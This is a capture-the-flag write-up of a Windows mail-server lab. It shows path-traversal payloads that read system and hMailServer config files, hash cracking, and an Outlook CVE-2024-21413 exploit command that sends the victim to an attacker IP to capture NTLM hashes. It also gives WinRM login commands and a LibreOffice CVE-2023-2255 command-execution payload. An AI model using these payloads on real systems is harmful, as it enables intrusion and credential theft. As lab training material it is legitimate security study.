## Initial Access – LFI via Download Parameter

- From the website I found a section that allows downloading a PDF with installation instructions for the mail service. The PDF referenced the emails `user@mailing.htb` and `maya@mailing.htb`, and indicated that Thunderbird should be used as the mail client.

- Inspecting the download button I noticed the parameter used to fetch the file:

	```python
	download.php?file=instructions.pdf
	```

- By modifying the `file` parameter I was able to read arbitrary files from the system (LFI). I confirmed it by reading internal files:

	```python
	download.php?file=../download.php
	download.php?file=../../../../../../Windows/System32/Drivers/etc/hosts
	```

- Since the PDF referenced Thunderbird, I looked for its configuration files in common paths but found nothing. I then tried the same approach with hMailServer and successfully read its configuration file:

	```python
	http://mailing.htb/download.php?file=../../../../../../Program Files (x86)/hMailServer/Bin/hMailServer.ini
	```

- This revealed two MD5 hashes:

  ```python
	AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
	Password=0a9f8ad8bf896b501dde74f08efd7e4c
  ```

- Using CrackStation and hashcat I recovered one of them in plaintext:

  ```python
	Administrator : homenetworkingadministrator
  ```

## CVE-2024-21413 – Microsoft Outlook RCE

- Using the recovered credentials I exploited [CVE-2024-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/tree/main), a Microsoft Outlook Remote Code Execution vulnerability, to send a malicious email to `maya@mailing.htb` pointing to a resource on my machine:

  ```python
	python3 CVE-2024-21413.py --username administrator@mailing.htb --password homenetworkingadministrator --server mailing.htb --url http://10.10.14.153/pepe --subject testeo --sender pepe@mailing.htb --port 587 --recipient maya@mailing.htb
  ```

- When the user accessed the email, her NTLMv2 hash was captured by my listener. I cracked it using hashcat:

  ```python
	hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  ```

- This revealed her plaintext password:

  ```python
	maya : m4y4ngs4ri
  ```

## Initial Shell

- I enumerated SMB shares using the recovered credentials and found a share named `Important Documents` with read and write permissions, though it was empty at the time.
- Since maya belongs to the Remote Management Users group, I connected via WinRM and retrieved the first flag:

  ```python
	evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
  ```

## Privilege Escalation – CVE-2023-2255 (LibreOffice)

- While enumerating the system I noticed LibreOffice was installed. I checked the version:

  ```python
	cat "C:\Program Files\libreoffice\program\version.ini"
  ```

- The installed version was **7.4.0.1**, which is vulnerable to [CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255/tree/main). This vulnerability allows crafting a malicious ODT document that executes arbitrary commands when opened, exploiting improper access control in floating frames that load external content without user prompt.
- I generated a malicious payload to copy the root flag to an accessible path:

  ```python
	python3 CVE-2023-2255.py --cmd 'cmd.exe /c type C:\\Users\localadmin\Desktop\root.txt > C:\\flag.txt' --output test2.odt
  ```

- I uploaded the file to the `Important Documents` SMB share. After a short wait, the document was opened automatically by the system, the payload executed as `localadmin`, and the root flag appeared at `C:\flag.txt`.
